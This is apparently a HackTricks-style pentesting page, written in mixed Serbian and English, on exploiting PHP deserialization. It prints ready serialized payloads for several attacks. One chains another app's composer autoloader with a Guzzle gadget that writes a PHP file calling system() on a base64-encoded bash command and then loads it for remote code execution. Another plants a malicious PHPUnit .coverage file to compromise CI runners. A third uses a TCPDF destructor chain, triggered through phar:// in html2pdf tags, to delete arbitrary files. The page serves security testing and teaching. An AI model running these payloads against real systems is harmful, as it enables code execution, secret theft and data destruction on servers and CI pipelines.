# PHP - Deserialization + Autoload Classes

{{#include ../../banners/hacktricks-training.md}}

Prvo, trebalo bi da proverite šta su [**Autoloading Classes**](https://www.php.net/manual/en/language.oop5.autoload.php).

## PHP deserialization + spl_autoload_register + LFI/Gadget

Našli smo se u situaciji gde smo otkrili **PHP deserialization in a webapp** pri čemu nije postojala nijedna biblioteka ranjiva na gadgets unutar **`phpggc`**. Međutim, u istom kontejneru postojao je **different composer webapp with vulnerable libraries**. Dakle, cilj je bio da **load the composer loader of the other webapp** i zloupotrebimo ga da **load a gadget that will exploit that library with a gadget** iz webapp ranjivog na deserialization.

Koraci:

- Pronašli ste **deserialization** i u trenutnom kodu aplikacije **there isn’t any gadget**
- Možete zloupotrebiti funkciju **`spl_autoload_register`** као у наставку да бисте **load any local file with `.php` extension**
- Za то користите десерииализацију где ће име класе бити унутар **`$name`**. Ви **cannot use "/" or "."** у имену класе у serializovanom объекту, али **code** је **replacing** the **underscores** ("_") **for slashes** ("/"). Тако ће име класе као `tmp_passwd` бити трансформисано у `/tmp/passwd.php` и код ће покушати да га учита.\
A **gadget example** will be: **`O:10:"tmp_passwd":0:{}`**

<details>
<summary>spl_autoload_register LFI/autoload example</summary>
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
</details>

> [!TIP]
> Ako imate **file upload** i možete upload-ovati fajl sa **`.php` extension`** mogli biste **abuse this functionality directly** i već dobiti RCE.

U mom slučaju, nisam imao ništa slično, ali je unutar **istog kontejnera** bila druga composer web stranica sa **bibliotekom ranjivom na `phpggc` gadget**.

- Da biste učitali ovu drugu biblioteku, prvo morate **load the composer loader of that other web app** (jer onaj od trenutne aplikacije neće imati pristup bibliotekama druge). **Poznavanje putanje aplikacije**, ovo možete vrlo lako postići sa: **`O:28:"www_frontend_vendor_autoload":0:{}`** (U mom slučaju, composer loader je bio u `/www/frontend/vendor/autoload.php`)
- Sada možete učitati composer loader druge aplikacije, pa je vreme da **`generate the phpgcc`** **payload** za upotrebu. U mom slučaju koristio sam **`Guzzle/FW1`**, što mi je omogućilo da **write any file inside the filesystem**.
- NOTE: The **generated gadget was not working**, da bi funkcionisao izmenio sam taj payload **`chain.php`** iz phpggc i postavio **sva svojstva** klasa **from private to public**. Ako ne, nakon deserializacije stringa, atributi kreiranih objekata nisu imali vrednosti.
- Sada imamo način da učitamo composer loader druge aplikacije i imamo **phpggc payload that works**, ali treba da ovo uradimo u **SAME REQUEST** da bi loader bio učitan kada se gadget koristi. Za to sam poslao serijalizovani niz sa oba objekta kao:
- Možete videti **prvo loader kako se učitava i zatim payload**
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
- Sada možemo **kreirati i upisati datoteku**, međutim korisnik **nije mogao pisati u nijednom direktorijumu unutar web servera**. Dakle, kao što se vidi u payload-u, PHP koji poziva **`system`** sa nekim **base64** je kreiran u **`/tmp/a.php`**. Zatim možemo **reuse the first type of payload** koji smo koristili kao LFI da učitamo composer loader drugog webapp-a t**o load the generated `/tmp/a.php`** datoteku. Samo ga dodajte u deserialization gadget:
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{} }
```
**Sažetak payload-a**

- **Učitaj composer autoload** drugog webapp-a u istom kontejneru
- **Učitaj phpggc gadget** da zloupotrebiš biblioteku iz drugog webapp-a (inicijalni webapp ranjiv na deserialization nije imao nijedan gadget u svojim bibliotekama)
- Gadget će **napraviti fajl sa PHP payload-om** u /tmp/a.php sa malicioznim komandama (korisnik webapp-a ne može da piše u nijednu fasciklu nijednog webapp-a)
- Završni deo našeg payload-a će koristiti **učitavanje generisanog php fajla** koji će izvršavati komande

Morao sam da **pozovem ovu deserialization dva puta**. U mojim testovima, prvi put fajl `/tmp/a.php` je bio kreiran ali nije učitan, a drugi put je pravilno učitan.

### Najnovije phpggc novosti (2025)

- **phpggc master branch nastavlja da dodaje chains**: OpenCart/RCE2, Drupal/FD1/SQLI1/XXE1, WordPress/YoastSEO/FW1 i drugi su dodati 2025 — korisno kada target app deli vendor code sa tim projektima. Brz način za pretragu je `phpggc -l | grep -E "OpenCart|Drupal|Yoast"` (prvo ažurirajte svoj clone).
- Kada miksate gadget-e između aplikacija preko autoloading-a, zapamtite da **private properties u definicijama gadget-a mogu biti izbačene** kada se klase ponovo deklarišu drugačije u target-u; izmenite gadget-ov `chain.php` da svojstva budu `public` ako payload stigne sa praznim vrednostima (isti trik prikazan gore).

## PHPUnit PHPT coverage deserialization (CI/CD entrypoint)

`phpunit` pre **8.5.52 / 9.6.34 / 10.5.63 / 11.5.50 / 12.5.8** (CVE-2026-24765) unserializovao je proizvoljne PHP objekte iz `.coverage` fajlova koje proizvodi **PHPT runner**. U CI pipeline-ima gde nepouzdani saradnici mogu da push-uju testove, postavljanje crafted `.coverage` fajla pokreće deserialization čim test suite krene — nema potrebe za web pristupom.

**Tok napada**

1. Postavite maliciozni `.coverage` fajl u repo (ili artifact) koji sadrži serialized gadget koji postoji u test dependencies (npr. Monolog ili Guzzle chain iz phpggc).
2. Pošaljite PR; kada CI pokrene `phpunit --configuration phpunit.xml`, PHPT runner pročita coverage fajl i deserializuje gadget, dajući **RCE inside the runner container**.
3. Ovo je posebno opasno kada testovi montiraju CI secrets (cloud creds, deployment keys).

**Minimalni maliciozni coverage stub** (ostavite pored PHPT testa):
```php
<?php
$payload = file_get_contents('php://stdin'); // serialized gadget from phpggc
file_put_contents('exploit.coverage', $payload);
```
Run the PHPT so phpunit consumes `exploit.coverage`.

## TCPDF `__destruct` POP chain for arbitrary file deletion

Kada se stvarna instanca `TCPDF` oslobodi od strane garbage collectora, poziva `_destroy(true)`, prolazi kroz `$this->imagekeys` i `unlink()`-uje sve što liči na cache fajl u `K_PATH_CACHE`. Ako aplikacija izvrši `unserialize($user_data)` dok je klasa `TCPDF` učitana (npr. očekuje niz sa `html` ključem), možete poslati serijalizovani objekat koji postavlja:

- `file_id` na bilo koji integer koji nije prisutan u `self::$cleaned_ids` (npr. `-1`).
- `imagekeys` na putanje koje počinju sa `K_PATH_CACHE` ili koje se mogu učiniti da tako izgledaju (npr. `/tmp/../tmp/do_not_delete_this_file.txt` kada je `K_PATH_CACHE` `/tmp/`).

Example payload hitting an unsafe `unserialize($_GET['p']); $pdf->writeHTML($payload['html']);` flow:
```text
a:1:{s:4:"html";O:5:"TCPDF":2:{s:7:"file_id";i:-1;s:9:"imagekeys";a:1:{i:0;s:39:"/tmp/../tmp/do_not_delete_this_file.txt";}}}
```
Fajl se briše čim objekat izađe iz opsega. TCPDF 6.9.3 je pooštrio proveru da bi uklonio samo putanje sa prefiksom `__tcpdf_<file_id>_` unutar `K_PATH_CACHE` i uveo `_unlink()` da bi blokirao scheme koje nisu `file://`, tako da su starije `Producer` verzije idealni ciljevi.

### Pokretanje gadgeta preko `phar://` u html2pdf `<cert>` tagovima

`spipu/html2pdf` (≤5.3.0) obavija TCPDF i izlaže prilagođeni `<cert>` blok čiji su `src`/`privkey` atributi proveravani običnom `file_exists()`. Na PHP < 8.0 bilo koja funkcija za fajl sistem koja pristupi `phar://` URL-u izaziva unserializaciju Phar metapodataka. Smeštanjem zlonamernog TCPDF objekta gore u Phar arhivu dobijate pouzdan POP čak i ako aplikacija nikada ne poziva `unserialize()` sama.

1. Kreiraj Phar sa `phar.readonly=0`, podesi stub/manifest da izgleda kao slika (npr. preimenuj `archive.phar` u `archive.png`), i skladišti serializovani TCPDF objekat u Phar metapodatke.
2. Otpremi/postavi fajl na mesto koje je dostupno, npr. `/tmp/user_files/user_1/archive.png`.
3. Pošalji HTML koji sadrži CERT tag tako da html2pdf reši putanju pod kontrolom napadača:
```html
<cert src="phar:///tmp/user_files/user_1/archive.png"
privkey="phar:///tmp/user_files/user_1/archive.png" />
```
Poziv na `file_exists()` deserijalizuje metapodatke, instancira TCPDF, a njegov destruktor briše odabrani fajl, pretvarajući html2pdf u moćnu `phar://` tačku ulaza. Verzija 5.3.1 je dodala `Security::checkValidPath()` da blokira neodobrene scheme, pa nasleđene implementacije i dalje ostaju atraktivne.

## References

- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)
- [GitLab Advisory – CVE-2024-51058 TCPDF Hash Comparison / Phar Deserialization](https://advisories.gitlab.com/pkg/composer/tecnickcom/tcpdf/)
- [CVE-2026-24765 – PHPUnit PHPT Coverage Unsafe Deserialization](https://cvereports.com/reports/CVE-2026-24765)

{{#include ../../banners/hacktricks-training.md}}
